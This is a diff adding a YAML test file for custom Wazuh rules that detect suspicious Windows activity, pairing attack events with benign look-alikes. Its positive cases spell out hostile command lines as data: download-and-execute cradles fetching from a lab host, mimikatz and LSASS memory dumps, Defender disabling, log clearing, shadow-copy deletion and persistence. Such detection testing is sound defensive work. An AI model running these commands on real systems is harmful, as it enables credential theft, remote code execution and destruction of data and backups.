@@ -1,0 +1,295 @@
+# Test cases for wazuh/rules/custom-suspicious-activity.xml
+# Every rule has a positive case and at least one benign look-alike.
+
+cases:
+  # ------------------------------------------------------------ 100120
+  - name: PowerShell with an encoded command fires 100120
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        originalFileName: PowerShell.EXE
+        commandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
+        parentImage: C:\Windows\System32\cmd.exe
+    expect: "100120"
+
+  - name: PowerShell running a script with -ExecutionPolicy Bypass is not an encoded command
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        commandLine: powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\nightly_backup.ps1
+        parentImage: C:\Windows\System32\svchost.exe
+    expect_not: "100120"
+
+  # ------------------------------------------------------------ 100121
+  - name: IEX + Net.WebClient download cradle fires 100121
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        commandLine: powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.100/a.ps1')"
+        parentImage: C:\Windows\System32\cmd.exe
+    expect: "100121"
+
+  - name: downloading an installer without executing it in memory is not a cradle
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        commandLine: powershell.exe -c "Invoke-WebRequest https://aka.ms/vs/17/release/vc_redist.x64.exe -OutFile C:\Temp\vc_redist.exe"
+        parentImage: C:\Windows\explorer.exe
+    expect_not: "100121"
+
+  # ------------------------------------------------------------ 100122
+  - name: SharpHound collection fires 100122
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        commandLine: powershell.exe -ep bypass -c "Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All"
+        parentImage: C:\Windows\System32\cmd.exe
+    expect: "100122"
+
+  - name: routine Get-Process is not offensive tooling
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        commandLine: powershell.exe Get-Process | Sort-Object CPU
+        parentImage: C:\Windows\explorer.exe
+    expect_not: "100122"
+
+  # ------------------------------------------------------------ 100123
+  - name: mshta loading a remote HTA fires 100123
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\mshta.exe
+        commandLine: mshta.exe http://10.0.2.100/update.hta
+        parentImage: C:\Windows\explorer.exe
+    expect: "100123"
+
+  - name: mshta opening a local help file is allowed
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\mshta.exe
+        commandLine: mshta.exe "C:\Program Files\Vendor\help\index.hta"
+        parentImage: C:\Windows\explorer.exe
+    expect_not: "100123"
+
+  # ------------------------------------------------------------ 100124
+  - name: mimikatz sekurlsa::logonpasswords fires 100124
+    events:
+      - sysmon: 1
+        image: C:\Users\Public\m.exe
+        commandLine: m.exe privilege::debug sekurlsa::logonpasswords exit
+        parentImage: C:\Windows\System32\cmd.exe
+    expect: "100124"
+
+  - name: a file merely named after a mimikatz module does not fire
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\notepad.exe
+        commandLine: notepad.exe C:\Users\jdoe\Documents\sekurlsa_notes.txt
+        parentImage: C:\Windows\explorer.exe
+    expect_not: "100124"
+
+  # ------------------------------------------------------------ 100125
+  - name: comsvcs.dll MiniDump of LSASS fires 100125
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\rundll32.exe
+        commandLine: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Users\Public\l.dmp full
+        parentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    expect: "100125"
+
+  - name: ProcDump of LSASS fires 100125
+    events:
+      - sysmon: 1
+        image: C:\Tools\procdump64.exe
+        commandLine: procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\out.dmp
+        parentImage: C:\Windows\System32\cmd.exe
+    expect: "100125"
+
+  - name: ProcDump of an application process is normal troubleshooting
+    events:
+      - sysmon: 1
+        image: C:\Tools\procdump64.exe
+        commandLine: procdump64.exe -accepteula -ma 4312 C:\Dumps\app.dmp
+        parentImage: C:\Windows\System32\cmd.exe
+    expect_not: "100125"
+
+  # ------------------------------------------------------------ 100126
+  - name: disabling Defender real-time monitoring fires 100126
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        commandLine: powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
+        parentImage: C:\Windows\System32\cmd.exe
+    expect: "100126"
+
+  - name: adding a Defender path exclusion fires 100126
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        commandLine: powershell.exe Add-MpPreference -ExclusionPath C:\Users\Public
+        parentImage: C:\Windows\System32\cmd.exe
+    expect: "100126"
+
+  - name: reading Defender preferences is benign
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        commandLine: powershell.exe Get-MpPreference | Select DisableRealtimeMonitoring
+        parentImage: C:\Windows\explorer.exe
+    expect_not: "100126"
+
+  # ------------------------------------------------------------ 100127
+  - name: wevtutil clearing the Security log fires 100127
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\wevtutil.exe
+        commandLine: wevtutil.exe cl Security
+        parentImage: C:\Windows\System32\cmd.exe
+        user: WIN10-LAB\jdoe
+    expect: "100127"
+
+  - name: wevtutil querying events is benign
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\wevtutil.exe
+        commandLine: wevtutil.exe qe Security /c:5 /f:text
+        parentImage: C:\Windows\System32\cmd.exe
+    expect_not: "100127"
+
+  # ------------------------------------------------------------ 100128
+  - name: bitsadmin download fires 100128
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\bitsadmin.exe
+        commandLine: bitsadmin.exe /transfer job /download /priority high http://10.0.2.100/a.exe C:\Users\Public\a.exe
+        parentImage: C:\Windows\System32\cmd.exe
+    expect: "100128"
+
+  - name: listing BITS jobs is benign
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\bitsadmin.exe
+        commandLine: bitsadmin.exe /list /allusers
+        parentImage: C:\Windows\System32\cmd.exe
+    expect_not: "100128"
+
+  # ------------------------------------------------------------ stock coverage
+  # Staging-folder drops are covered by the stock ruleset, so there is no
+  # custom rule for them; these cases make sure that stays true.
+  - name: "[stock] executable dropped into AppData\\Local\\Temp fires 92213"
+    events:
+      - sysmon: 11
+        image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        targetFilename: C:\Users\jdoe\AppData\Local\Temp\payload.exe
+    expect: "92213"
+
+  - name: "[stock] executable dropped into C:\\Users\\Public fires 92207"
+    events:
+      - sysmon: 11
+        image: C:\Windows\System32\certutil.exe
+        targetFilename: C:\Users\Public\a.exe
+    expect: "92207"
+
+  - name: "[stock] certutil -urlcache download fires 92075"
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\certutil.exe
+        originalFileName: CertUtil.exe
+        commandLine: certutil.exe -urlcache -split -f http://10.0.2.100/a.exe C:\Users\Public\a.exe
+        parentImage: C:\Windows\System32\cmd.exe
+    expect: "92075"
+
+  - name: "[stock] LSASS opened with read access fires 92900"
+    events:
+      - sysmon: 10
+        sourceImage: C:\Users\Public\m.exe
+        targetImage: C:\Windows\system32\lsass.exe
+        grantedAccess: "0x1010"
+    expect: "92900"
+
+  # ------------------------------------------------------------ 100130
+  - name: Run key pointing at C:\Users\Public fires 100130
+    events:
+      - sysmon: 13
+        eventType: SetValue
+        image: C:\Windows\System32\reg.exe
+        targetObject: HKU\S-1-5-21-1111-2222-3333-1001\Software\Microsoft\Windows\CurrentVersion\Run\Updater
+        details: C:\Users\Public\upd.exe
+    expect: "100130"
+
+  - name: OneDrive Run key is benign
+    events:
+      - sysmon: 13
+        eventType: SetValue
+        image: C:\Program Files\Microsoft OneDrive\OneDrive.exe
+        targetObject: HKU\S-1-5-21-1111-2222-3333-1001\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive
+        details: '"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background'
+    expect_not: "100130"
+
+  # ------------------------------------------------------------ 100131
+  - name: scheduled task running hidden PowerShell fires 100131
+    events:
+      - security: 4698
+        subjectUserName: jdoe
+        taskName: \OneDriveSync
+        taskContent: <Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -c "iex(irm http://10.0.2.100/s)"</Arguments></Exec></Actions></Task>
+    expect: "100131"
+
+  - name: Google Update scheduled task is benign
+    events:
+      - security: 4698
+        subjectUserName: SYSTEM
+        taskName: \GoogleUpdateTaskMachineCore
+        taskContent: <Task><Actions><Exec><Command>C:\Program Files (x86)\Google\Update\GoogleUpdate.exe</Command><Arguments>/c</Arguments></Exec></Actions></Task>
+    expect_not: "100131"
+
+  # ------------------------------------------------------------ 100132
+  - name: vssadmin delete shadows fires 100132
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\vssadmin.exe
+        commandLine: vssadmin.exe delete shadows /all /quiet
+        parentImage: C:\Users\Public\enc.exe
+    expect: "100132"
+
+  - name: bcdedit disabling recovery fires 100132
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\bcdedit.exe
+        commandLine: bcdedit.exe /set {default} recoveryenabled No
+        parentImage: C:\Windows\System32\cmd.exe
+    expect: "100132"
+
+  - name: listing shadow copies is benign
+    events:
+      - sysmon: 1
+        image: C:\Windows\System32\vssadmin.exe
+        commandLine: vssadmin.exe list shadows
+        parentImage: C:\Windows\System32\cmd.exe
+    expect_not: "100132"
+
+  # ------------------------------------------------------------ 100133 / 100134
+  - name: one file with a ransomware extension fires low-level 100133
+    events:
+      - sysmon: 11
+        image: C:\Users\Public\enc.exe
+        targetFilename: C:\Users\jdoe\Documents\q3-budget.xlsx.locked
+    expect: "100133"
+
+  - name: 10 encrypted-extension files from one process fire 100134
+    events:
+      - repeat: 10
+        event:
+          sysmon: 11
+          image: C:\Users\Public\enc.exe
+          targetFilename: C:\Users\jdoe\Documents\q3-budget.xlsx.locked
+    expect: "100134"
+
+  - name: 9 encrypted-extension files stay under the ransomware threshold
+    events:
+      - repeat: 9
+        event:
+          sysmon: 11
+          image: C:\Users\Public\enc.exe
+          targetFilename: C:\Users\jdoe\Documents\q3-budget.xlsx.locked
+    expect_not: "100134"
